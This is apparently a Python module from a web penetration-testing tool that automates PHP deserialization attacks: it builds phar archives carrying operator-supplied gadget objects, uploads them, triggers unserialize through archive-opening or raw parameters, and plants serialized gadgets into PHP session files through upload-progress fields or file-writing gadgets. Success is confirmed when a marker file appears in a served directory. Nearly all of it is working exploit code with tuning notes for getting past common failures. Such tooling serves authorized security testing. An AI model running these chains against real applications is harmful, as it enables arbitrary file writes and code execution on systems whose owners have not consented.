"""Getting an archive's metadata deserialized, and proving it happened.

The phar chain in full, and every step of it is a thing that can fail on its own:

1. **A call site.** PHP 8 does not deserialize a metadata blob when something
   reads inside an archive - only when the application asks for it. So the target
   has to have a place that opens an archive it was pointed at, and `probe_archive`
   looks for one by the error PHP produces when a non-archive reaches `new Phar`.
2. **An archive on the target.** Built here rather than handed over, because the
   gadget needs a marker and a path that are fresh for this run; uploaded through
   the endpoint the operator names, when they name one.
3. **A gadget.** The class and its properties come from the command line, because
   they come from the target's own code - the one part that cannot be worked out
   from out here.
4. **A side effect.** The gadget is aimed at a file name under a directory the
   application serves, so the proof of execution is a request that returns a
   string this run invented.

The chain is honest about which of those it got. A run that found a call site but
no way to put an archive on the target says so; one that uploaded an archive into
a directory nobody serves says the write landed and nothing could be read back.
"""

from __future__ import annotations

import secrets
from dataclasses import dataclass
from urllib.parse import urljoin

from ...core import phar
from ...core.httpmsg import Request
from ...engine.bypass import Confidence
from ...engine.inject import inject
from ...engine.sideeffect import make_marker, probe_side_effect, was_there_before
from ...engine.sessionsink import (
    SESSION_DIRS,
    candidates as session_candidates,
    looks_like_session_data,
    looks_missing,
    progress_request,
    session_from_response,
    session_id_from_cookie,
)
from ...engine.upload import reachable_url, upload
from ...engine.webroot import WRITABLE_CANDIDATES, roots_for_run

SINK = "proto.archive.sink"
UNSERIALIZE_SINK = "proto.unserialize.sink"
SESSION_FILE = "proto.session.file"
SESSION_READER = "proto.session.reader"
PHAR_RAN = "proto.phar.executed"

# The name an entry is filed under in a session written by the `php` handler. Any
# name works - the handler splits on the pipe and unserializes what follows - and
# it is random per run so that anything looking for it is looking for something
# the target could not have produced on its own. A fixed short name is how a
# check ends up matching the session path instead of the payload.
SESSION_KEY = "ik" + secrets.token_hex(6)

# How large a body the session delivery sends. PHP only holds the progress entry
# while the request body is being read, so the upload has to still be running for
# there to be anything to read; a body this size takes measurable time on any
# link rather than finishing between two statements.
SESSION_PAD = 512 * 1024


@dataclass
class Gadget:
    """The class to build, and the properties to give it."""

    class_name: str = ""
    properties: dict[str, str] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        if self.properties is None:
            self.properties = {}

    @property
    def usable(self) -> bool:
        return bool(self.class_name)

    def references(self, *names: str) -> bool:
        """Whether any property value carries one of these placeholders."""
        return any(
            "{" + name + "}" in value for value in self.properties.values() for name in names
        )

    @property
    def for_session(self) -> bool:
        """Whether this gadget was written to plant a session.

        The placeholders say which chain the operator meant, and that matters
        because the chains share one gadget: a gadget written for the session has
        no write target for the archive chain to fill, so letting that chain run
        first spends the whole request budget on payloads carrying the literal
        text `{session}` and reports nothing.
        """
        planted = self.references("session", "payload")
        aimed = self.references("file", "marker", "url")
        return planted and not aimed

    def roles(self) -> tuple[str, str]:
        """Which property takes a path, and which takes the content written there.

        Read off the placeholders rather than configured separately: a property
        whose value is `{session}` is the one holding the path, and one whose
        value is `{payload}` is the one holding what gets written. The same two
        roles then describe the object that is written *into* the session, which
        is what makes a two-stage plant poss-ible without a second set of flags.
        """
        path_property = next(
            (name for name, value in self.properties.items() if value.strip() == "{session}"), ""
        )
        content_property = next(
            (name for name, value in self.properties.items() if value.strip() == "{payload}"), ""
        )
        return path_property, content_property


def _fill(value: str, fields: dict[str, str]) -> str:
    """Substitute the placeholders a gadget's properties are written with.

    `{file}` is the path the gadget is asked to write, `{marker}` is what it is
    asked to write there, and `{url}` is where that file will be served from.
    The operator knows which property holds a path; the tool knows what a fresh
    path and a fresh marker are, and this is where the two meet.
    """
    out = value
    for name, replacement in fields.items():
        out = out.replace("{" + name + "}", replacement)
    return out


def build_archive(gadget: Gadget, fields: dict[str, str]) -> bytes:
    """The archive, with its metadata built from the gadget and the substitutions."""
    properties = {name: _fill(value, fields) for name, value in gadget.properties.items()}
    metadata = phar.php_object(gadget.class_name, properties)
    return phar.build(files=[("index.php", b"<?php echo 1;")], metadata=metadata)


def write_targets(roots, upload_dir: str = "", limit: int = 12) -> list[str]:
    """The directories the gadget might write into, most likely first.

    Two things have to be true at once: the directory has to be writable by the
    user the application runs as, and it has to be one the web server serves. The
    web root itself is often neither writable nor - on a stock install - owned by
    that user, while an upload directory usually is, because accepting files is
    what it is for.

    So the directory an upload landed in comes first when the run knows it, and
    failing that the names such a directory usually has. The root itself is tried
    too: a development checkout is often writable throughout, and a chain that
    skipped it would miss the easy case.

    A relative path is not in the list, and that is a measured decision rather
    than a preference: PHP resolves a relative path against the working directory
    of the process, and a web request's is not reliably the directory it serves
    from. A gadget asked for a relative path wrote into the filesystem root,
    where nothing is served - and on a locked-down worker, into nothing at all.

    `limit` is not tidiness: each entry costs an archive, an upload and a
    trigger, and a list that runs to a hundred directories is a scan rather than
    a chain.
    """
    if upload_dir:
        subdirectories = [upload_dir.strip("/")]
    else:
        subdirectories = list(WRITABLE_CANDIDATES[:4]) + [""]

    out: list[str] = []
    seen: set[str] = set()
    for root in roots:
        base = root.path.rstrip("/")
        for directory in subdirectories:
            written = f"{base}/{directory}/" if directory else f"{base}/"
            if written not in seen:
                seen.add(written)
                out.append(written)
    return out[:limit]


def served_at(directory: str, root: str, name: str) -> str:
    """The URL a file written into `directory` under `root` is served from."""
    relative = directory[len(root):].strip("/")
    return f"/{relative}/{name}" if relative else f"/{name}"


def directory_of(landed: str) -> str:
    """The directory part of a path the target gave, when it gave a relative one.

    An upload endpoint that answers `uploads/x.phar` has just said which
    directory it writes into, and that directory is by definition writable and -
    since the archive is meant to be fetched - served. It is the best place to
    ask a gadget to write, and the target volunteered it.
    """
    landed = (landed or "").strip()
    if not landed or landed.startswith("/") or "/" not in landed:
        return ""
    return landed.rsplit("/", 1)[0].strip("/")


def exploit_phar(ctx) -> None:
    """Run the chain: find the call site, put an archive there, read the result."""
    gadget = Gadget(
        class_name=ctx.config.get("phar_class") or "",
        properties=dict(ctx.config.get("phar_set") or {}),
    )
    if not gadget.usable:
        ctx.blackboard.mark_not_covered(
            "exploit.phar",
            "no gadget was given; pass --phar-class with the class the target's code autoloads",
        )
        return
    if gadget.for_session:
        ctx.blackboard.mark_not_covered(
            "exploit.phar",
            "the gadget was written to plant a session ({session}/{payload}), so it names no "
            "directory for this chain to write into",
        )
        return

    sink = ctx.blackboard.get(SINK)
    if not sink:
        ctx.blackboard.mark_not_covered(
            "exploit.phar",
            "no parameter on this target was found opening archives, so there is nothing to "
            "point an archive at",
        )
        return

    base = _base_of(ctx)
    roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
    if not roots.guesses:
        ctx.blackboard.mark_not_covered(
            "exploit.phar", "no directory was established that the application could write into"
        )
        return
    ctx.info(f"   {roots.describe()}")

    root_paths = [guess.path for guess in roots.guesses]
    param = _param_for(ctx, sink)
    archive_dir = ctx.config.get("archive_dir") or ""

    # One candidate at a time, stopping at the first that serves the file back.
    # Each costs an archive, an upload and a trigger, which is why the list is
    # ordered by how much each entry is believed and why it is short.
    #
    # The list grows once: the first upload says which directory an upload lands
    # in, and that directory is the best place to write - it is writable by
    # definition and it is where the archive itself is already being served from.
    tried: list[str] = []
    targets = write_targets(roots.guesses, archive_dir)
    index = 0
    while index < len(targets):
        directory = targets[index]
        index += 1
        if ctx.stopped:
            return
        root = next((r for r in root_paths if directory.startswith(r.rstrip("/") + "/")), "")
        if not root:
            continue
        name = f"ik{secrets.token_hex(6)}.txt"
        written = directory + name
        served = urljoin(base.rstrip("/") + "/", served_at(directory, root, name).lstrip("/"))
        marker = make_marker()

        archive = build_archive(gadget, {"file": written, "marker": marker, "url": served})
        landed = _place_archive(ctx, archive, base)
        if landed is None:
            return
        archive_path, how = landed

        # The first upload volunteers the directory uploads land in. Anything
        # asking the gadget to write is better off there than in the web root,
        # which is usually owned by someone else - so those candidates go next,
        # not at the end of a list that may be a dozen roots long.
        if not archive_dir:
            learned = directory_of(archive_path)
            if learned:
                archive_dir = learned
                extra = [t for t in write_targets(roots.guesses, archive_dir) if t not in targets]
                targets[index:index] = extra
                ctx.info(
                    f"   uploads land in {learned}/, which is writable and served; "
                    "trying that next"
                )

        if was_there_before(ctx, served):
            tried.append(f"{written}: already served something")
            continue

        inject(ctx, param, archive_path, "exploit.phar.trigger")
        ctx.info(f"   asked the gadget to write {written}; archive {how}")

        effect = probe_side_effect(ctx, served, marker)
        if effect.proved:
            _report_ran(ctx, gadget, sink, archive_path, effect)
            return
        tried.append(f"{written}: {effect.describe()}")

    ctx.emit(f"  [!] the gadget did not run anywhere it was asked to write ({len(tried)} tried)")
    ctx.blackboard.set(
        "proto.phar.no-effect",
        "the archive was opened but no file it was asked to write was served",
        evidence="; ".join(tried)[:400],
        confidence=Confidence.LIKELY,
    )


def build_object(gadget: Gadget, fields: dict[str, str]) -> str:
    """The metadata blob on its own, for a call site that takes the value directly.

    An archive is one way to get a serialized object in front of `unserialize()`;
    handing the string to a parameter is the other, and it needs no upload, no
    file and no second request. The blob is the same either way - which is why
    the gadget is defined once and only the delivery differs.
    """
    properties = {name: _fill(value, fields) for name, value in gadget.properties.items()}
    return phar.php_object(gadget.class_name, properties).decode("utf-8", "replace")


def exploit_unserialize(ctx) -> None:
    """Send the gadget as a value to whatever might hand it to `unserialize()`.

    No pre-screening, and that is deliberate. A sink is confirmed by something
    happening, and the gadget's side effect is that something: the request that
    deserializes it also runs the destructor that writes the file. So the search
    and the proof are one step, and a parameter that is not a sink costs a
    request.

    The lighter signals - PHP's own error, and a value whose trailing junk goes
    missing - are still worth having, because they say *which* parameter is the
    call site rather than only that one of them is. Nothing here depends on them:
    production sets `display_errors` off, and the lab does too.
    """
    gadget = Gadget(
        class_name=ctx.config.get("phar_class") or "",
        properties=dict(ctx.config.get("phar_set") or {}),
    )
    if not gadget.usable:
        ctx.blackboard.mark_not_covered(
            "exploit.unserialize",
            "no gadget was given; pass --phar-class with the class the target's code autoloads",
        )
        return
    if gadget.for_session:
        ctx.blackboard.mark_not_covered(
            "exploit.unserialize",
            "the gadget was written to plant a session ({session}/{payload}), so its "
            "properties name no file for this chain to ask for",
        )
        return

    base = _base_of(ctx)
    roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
    if not roots.guesses:
        ctx.blackboard.mark_not_covered(
            "exploit.unserialize",
            "no directory was established that the application could write into",
        )
        return
    ctx.info(f"   {roots.describe()}")

    targets = write_targets(roots.guesses, ctx.config.get("archive_dir") or "")
    order = sorted(
        run_params(ctx),
        key=lambda param: 0 if param.key() == (ctx.blackboard.get(UNSERIALIZE_SINK) or "") else 1,
    )

    tried: list[str] = []
    for param in order:
        if ctx.stopped:
            return
        for directory in targets:
            root = next(
                (g.path for g in roots.guesses if directory.startswith(g.path.rstrip("/") + "/")),
                "",
            )
            if not root:
                continue
            name = f"ik{secrets.token_hex(6)}.txt"
            written = directory + name
            served = urljoin(base.rstrip("/") + "/", served_at(directory, root, name).lstrip("/"))
            marker = make_marker()

            payload = build_object(gadget, {"file": written, "marker": marker, "url": served})
            inject(ctx, param, payload, "exploit.unserialize")

            effect = probe_side_effect(ctx, served, marker)
            if effect.proved:
                _report_ran(ctx, gadget, param.key(), payload, effect)
                return
            tried.append(f"{param.key()} -> {written}: nothing served")

    ctx.emit(f"  [!] no parameter produced a file ({len(tried)} tries)")
    ctx.blackboard.mark_not_covered(
        "exploit.unserialize",
        "no parameter was found handing its value to unserialize: no gadget took effect, and "
        "neither the function's error nor a parsed value was observed",
    )


def exploit_session(ctx) -> None:
    """Look for the session file, and try to put a gadget in it.

    The sink here is not a parameter - it is `session_start()`, which every
    request that uses a session calls, and which hands the contents of a file to
    `unserialize()`. So the work is entirely on the other two: finding the file,
    and getting bytes into it.

    The file is found by reading it, which also proves it is reachable from here;
    a file that cannot be read is one an include could not reach either. Then the
    standard delivery is attempted - a multipart post whose progress field PHP
    writes into the session - and the file is read back to see whether it landed.

    Each stage is reported as it stands. A sink that is reachable and a delivery
    that did not land is a real and useful result: it says the target is one file
    write away, and it does not claim the chain ran.
    """
    cookie_name, ident = _session_identity(ctx)
    if not ident:
        ctx.blackboard.mark_not_covered(
            "exploit.session",
            "no session cookie was seen on this target and none was provided, so there is "
            "no session file to look for",
        )
        return
    ctx.info(f"   the target uses {cookie_name}={ident}")

    base = _base_of(ctx)
    paths = session_candidates(SESSION_DIRS, ident)
    read_params = list(run_params(ctx))

    for param in read_params:
        if ctx.stopped:
            return
        for path in paths:
            if ctx.stopped:
                return
            _, exchange = inject(ctx, param, path, "probe.session")
            if exchange.response.error:
                continue
            body = exchange.response.text
            if looks_missing(body) or not looks_like_session_data(body):
                continue

            ctx.emit(f"  [+] the session file at {path} is readable through {param.key()}")
            ctx.blackboard.set(
                SESSION_FILE,
                path,
                evidence=f"{param.key()} read {len(body)} bytes of session data",
                confidence=Confidence.CONFIRMED,
            )
            # Which parameter did the reading is part of the finding, not a
            # detail to work out again later. Asking another parameter to read
            # the same file afterwards is how a verification ends up pointed at
            # something that does not read files at all.
            ctx.blackboard.set(
                SESSION_READER,
                param.key(),
                evidence="the parameter the session file was read through",
                confidence=Confidence.CONFIRMED,
            )
            _attempt_session_delivery(ctx, param, base, path, cookie_name, ident)
            return

    ctx.blackboard.mark_not_covered(
        "exploit.session",
        f"the session file for {cookie_name}={ident} was not found in any of the usual "
        "directories, so it cannot be reached from here",
    )


def _attempt_session_delivery(ctx, param, base: str, path: str, cookie_name: str, ident: str) -> None:
    """Get a gadget into the session file, by whichever route is available.

    Two routes, and the second is the one that works. The progress field is what
    the technique is usually described with, and it is tried because on some
    targets it is the only one; then a gadget that writes a file is aimed at the
    session path, which needs nothing from PHP but the write itself.
    """
    gadget = Gadget(
        class_name=ctx.config.get("phar_class") or "",
        properties=dict(ctx.config.get("phar_set") or {}),
    )
    if not gadget.usable:
        ctx.blackboard.set(
            "proto.session.delivery",
            "not attempted: the sink was found but no --phar-class was given to plant",
            evidence=f"{path} is reachable and holds session data",
            confidence=Confidence.CONFIRMED,
        )
        return

    _try_progress_delivery(ctx, param, base, path, cookie_name, ident, gadget)
    if ctx.blackboard.get("proto.session.planted"):
        return

    _try_gadget_delivery(ctx, path, gadget)


def _try_progress_delivery(
    ctx, param, base: str, path: str, cookie_name: str, ident: str, gadget: Gadget
) -> None:
    """The standard route: a progress field PHP writes into the named session."""
    marker = make_marker()
    payload = "|" + build_object(gadget, {"file": "", "marker": marker, "url": ""})
    request = progress_request(base, ident, cookie_name, payload, size=SESSION_PAD)
    ctx.info(f"   posting a progress field into {cookie_name}={ident} ({SESSION_PAD} bytes)")
    ctx.send(request, action="exploit.session.plant")

    _, exchange = inject(ctx, param, path, "exploit.session.verify")
    if marker in exchange.response.text:
        ctx.emit(f"  [+] the payload landed in {path} through the progress field")
        ctx.blackboard.set(
            "proto.session.planted",
            True,
            evidence=f"the marker appeared in {path} after the progress upload",
            confidence=Confidence.CONFIRMED,
        )


def _try_gadget_delivery(ctx, path: str, gadget: Gadget) -> None:
    """Aim a file-writing gadget at the session file.

    A gadget that writes a file writes it wherever it is told. Pointed at the
    session file it plants the payload directly - no upload, no progress field,
    nothing from PHP except the write. The content it writes is its own, so the
    session-shaped value has to survive whatever it puts around it: the `php`
    handler splits on `|` and unserializes what follows, and anything before the
    pipe becomes the key. That is why the value handed to the gadget starts with
    a pipe and a name, and why the fixed text a gadget prefixes is harmless.
    """
    sink = ctx.blackboard.get(SINK)
    base = _base_of(ctx)
    roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
    if not roots.guesses:
        return
    if not sink:
        ctx.blackboard.set(
            "proto.session.delivery",
            "the session file is reachable but nothing can write to it: the progress field "
            "left nothing behind and no archive-opening parameter was found to run a "
            "file-writing gadget through",
            evidence=f"{path} is reachable",
            confidence=Confidence.LIKELY,
        )
        return

    param = _param_for(ctx, sink)
    path_property, content_property = gadget.roles()
    if not path_property or not content_property:
        ctx.blackboard.set(
            "proto.session.delivery",
            "the session file is reachable but the gadget does not say which property holds the "
            "path and which holds the written value: write them as `--phar-set NAME={session}` "
            "and `--phar-set NAME={payload}`",
            evidence=f"{path} is reachable",
            confidence=Confidence.LIKELY,
        )
        return

    for directory in write_targets(roots.guesses, ctx.config.get("archive_dir") or ""):
        if ctx.stopped:
            return
        root = next(
            (g.path for g in roots.guesses if directory.startswith(g.path.rstrip("/") + "/")), ""
        )
        if not root:
            continue
        name = f"ik{secrets.token_hex(6)}.txt"
        written = directory + name
        served = urljoin(base.rstrip("/") + "/", served_at(directory, root, name).lstrip("/"))
        marker = make_marker()

        # Two objects of the same class. The outer one is pointed at the session
        # file and writes the inner one into it; the inner one is what the
        # application builds when it next reads the session, and it is aimed at a
        # file the application serves so that its running is observable.
        inner = phar.php_object(
            gadget.class_name, {path_property: written, content_property: marker}
        ).decode("utf-8", "replace")
        session_value = SESSION_KEY + "|" + inner
        outer = phar.php_object(
            gadget.class_name, {path_property: path, content_property: session_value}
        )
        archive = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=outer)

        landed = _place_archive(ctx, archive, base)
        if landed is None:
            return
        archive_path, how = landed
        inject(ctx, param, archive_path, "exploit.session.write")

        # Then let the application read its own session, which is what builds the
        # object. This is the whole verification, and deliberately so.
        #
        # Reading the session file back to confirm the payload landed does not
        # work here, and the reason is worth writing down: PHP removes the file
        # itself when `session_start()` cannot decode it, and a writer that puts
        # anything after the last complete pair - a newline, a semicolon, a stray
        # character - makes it undecodable. A gadget's own output format usually
        # ends in a newline, so this is the common case rather than a corner.
        # The object is still built before the failure, which is what matters:
        # the request that decodes it is the request that runs it. So the side
        # effect is the evidence, and a file that has since been removed is not
        # a reason to call the chain broken.
        ctx.send(ctx.config["request"], action="exploit.session.trigger")
        effect = probe_side_effect(ctx, served, marker)
        if effect.proved:
            _report_ran(ctx, gadget, f"session:{path}", session_value[:400], effect)
            ctx.blackboard.set(
                "proto.session.planted",
                True,
                evidence=effect.describe(),
                confidence=Confidence.CONFIRMED,
            )
            return
        ctx.emit(f"  [!] the payload was written to {path} ({how}) but nothing was served")


def _session_identity(ctx) -> tuple[str, str]:
    """The session cookie, from the operator or from what the target sets."""
    request = ctx.config.get("request")
    found = session_id_from_cookie(request.headers.get("Cookie") or "" if request else "")
    if found != ("", ""):
        return found

    # No cookie given, so ask the target for one and read what it sets.
    request = ctx.config.get("request")
    if request is None:
        return "", ""
    exchange = ctx.send(request, action="probe.session-cookie")
    return session_from_response(exchange.response)


def _report_ran(ctx, gadget, sink: str, archive_path: str, effect) -> None:
    """A gadget that ran, recorded as a finding and on the board."""
    ctx.emit(f"  [+] {effect.describe()}")
    ctx.blackboard.set(
        PHAR_RAN,
        True,
        evidence=effect.describe(),
        confidence=Confidence.CONFIRMED,
    )
    ctx.blackboard.add(
        "proto.findings",
        {
            "name": f"{gadget.class_name} via {sink}",
            "param": sink,
            "payload": archive_path,
            "generation": 0,
            "request": "",
            "evidence": effect.describe(),
            "family": "deserialization",
            "wrapper_note": "the target built the object from what it was given and the gadget ran",
        },
    )


def _base_of(ctx) -> str:
    from urllib.parse import urlsplit

    return f"{urlsplit(ctx.config['request'].url).scheme}://{urlsplit(ctx.config['request'].url).netloc}"


def run_params(ctx) -> list:
    """The parameters this run is working on, in the order it picked them.

    Taken from the run's own configuration rather than from the graph, so this
    module does not have to reach back into the module that calls it.
    """
    return list(ctx.config.get("params") or [])


def _param_for(ctx, key: str):
    """The parameter the finding named, looked up among this run's candidates."""
    for param in run_params(ctx):
        if param.key() == key:
            return param
    raise LookupError(key)


def _place_archive(ctx, archive: bytes, base: str) -> tuple[str, str] | None:
    """Put the archive on the target, by uploading it or by being told where it is.

    Uploading closes the loop; being told is the fallback for a target whose
    upload path is not a form the tool can reach. The path is returned with a
    phrase saying which of the two happened, because the operator needs to know
    whether a failure was the archive or the assumption about where it went.
    """
    upload_to = ctx.config.get("upload_to") or ""
    if upload_to:
        name = f"ik{secrets.token_hex(6)}.phar"
        landed = upload(
            ctx,
            upload_to,
            archive,
            name,
            field=ctx.config.get("upload_field") or "file",
            content_type="application/x-php",
        )
        if not landed.landed:
            ctx.emit("  [-] the upload endpoint did not accept the archive")
            ctx.blackboard.mark_dead_end("exploit.phar", "the upload was refused")
            return None
        ctx.info(f"   uploaded as {name}; {landed.describe()}")
        return landed.path, "uploaded"

    given = ctx.config.get("upload") or ""
    if given:
        # A path the operator gives may be the file or the directory it is in.
        if given.endswith("/"):
            name = f"ik{secrets.token_hex(6)}.phar"
            return f"{given.rstrip('/')}/{name}", "named by the operator"
        return given, "named by the operator"

    ctx.blackboard.mark_not_covered(
        "exploit.phar",
        "there is no archive on the target to point at: pass --upload-to with the upload "
        "endpoint, or --upload with the path an archive already occupies",
    )
    return None
